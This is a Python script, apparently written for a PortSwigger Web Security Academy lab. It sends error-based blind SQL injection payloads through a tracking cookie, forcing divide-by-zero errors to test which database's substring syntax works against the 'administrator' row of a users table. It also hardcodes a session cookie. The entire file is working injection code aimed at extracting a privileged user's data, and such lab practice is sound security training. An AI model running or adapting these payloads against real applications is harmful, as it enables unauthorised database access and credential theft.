import asyncio
import aiohttp

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"

async def test_substr_functions():
    """測試不同的字串截取函數語法"""
    
    # 不同資料庫的字串截取函數
    test_cases = [
        # Oracle 語法
        ("Oracle SUBSTR", "SUBSTR('aaa',1,1)='a'"),
        ("Oracle SUBSTR wrong", "SUBSTR('aaa',1,1)='b'"),
        
        # MySQL 語法  
        ("MySQL SUBSTRING", "SUBSTRING('aaa',1,1)='a'"),
        ("MySQL SUBSTRING wrong", "SUBSTRING('aaa',1,1)='b'"),
        ("MySQL SUBSTR", "SUBSTR('aaa',1,1)='a'"),
        ("MySQL SUBSTR wrong", "SUBSTR('aaa',1,1)='b'"),
        ("MySQL LEFT", "LEFT('aaa',1)='a'"),
        ("MySQL LEFT wrong", "LEFT('aaa',1)='b'"),
        
        # PostgreSQL 語法
        ("PostgreSQL SUBSTRING", "SUBSTRING('aaa' FROM 1 FOR 1)='a'"),
        ("PostgreSQL SUBSTRING wrong", "SUBSTRING('aaa' FROM 1 FOR 1)='b'"),
        
        # SQL Server 語法
        ("SQL Server SUBSTRING", "SUBSTRING('aaa',1,1)='a'"),
        ("SQL Server SUBSTRING wrong", "SUBSTRING('aaa',1,1)='b'"),
        
        # SQLite 語法
        ("SQLite SUBSTR", "SUBSTR('aaa',1,1)='a'"),
        ("SQLite SUBSTR wrong", "SUBSTR('aaa',1,1)='b'"),
        
        # 使用字串索引（某些資料庫支援）
        ("String indexing", "'aaa'[1]='a'"),
        ("String indexing wrong", "'aaa'[1]='b'"),
    ]
    
    async with aiohttp.ClientSession() as session:
        for name, condition in test_cases:
            payload = f"'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            status = await test_payload(session, payload)
            expected = "500" if "wrong" not in name else "200"
            result = "✅" if str(status) == expected else "❌"
            print(f"{result} {name}: {status} (期望: {expected})")
            await asyncio.sleep(0.1)  # 避免請求太快

async def test_payload(session: aiohttp.ClientSession, payload: str) -> int:
    """測試單個 payload"""
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    params = {"category": "Gifts"}
    
    try:
        async with session.get(BASE_URL, cookies=cookies, params=params, timeout=10, allow_redirects=False) as resp:
            return resp.status
    except Exception as e:
        print(f"Error: {e}")
        return 0

if __name__ == "__main__":
    asyncio.run(test_substr_functions())